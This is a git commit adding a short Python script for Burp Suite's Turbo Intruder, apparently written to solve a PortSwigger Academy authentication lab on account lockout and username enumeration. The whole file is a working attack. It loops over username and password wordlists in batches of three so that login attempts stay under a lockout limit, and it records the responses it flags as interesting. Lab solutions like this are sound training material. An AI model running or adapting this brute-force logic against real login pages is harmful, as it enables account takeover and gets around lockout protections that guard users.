277f99bef3da4878413feda984383e9fb7ac7f10
Alex Rodriguez <44281620+bin3xish477@users.noreply.github.com>
2023-12-04 12:46:06 -0500

    Create account-lockout-username-enum-turbo-intruder.py

---
+++ PortSwiggerAcademy/ServerSideAttacks/Authentication/account-lockout-username-enum-turbo-intruder.py
@@ -0,0 +1,20 @@
+def queueRequests(target, wordlists):
+    engine = RequestEngine(endpoint=target.endpoint,
+                           concurrentConnections=1,
+                           requestsPerConnection=10,
+                           engine=Engine.BURP2
+                           )
+    buffer = []
+    chunk_size = 3
+    for line in open('/Users/alexrrr/portswigger-labs/passwords.txt'):
+        buffer.append(line.rstrip())
+        if len(buffer) == chunk_size:
+            for username in open('/Users/alexrrr/portswigger-labs/usernames.txt'):
+                for passwd in buffer:
+                    engine.queue(target.req, [username.rstrip(), passwd])
+            buffer = []
+
+
+def handleResponse(req, interesting):
+    if interesting:
+        table.add(req)
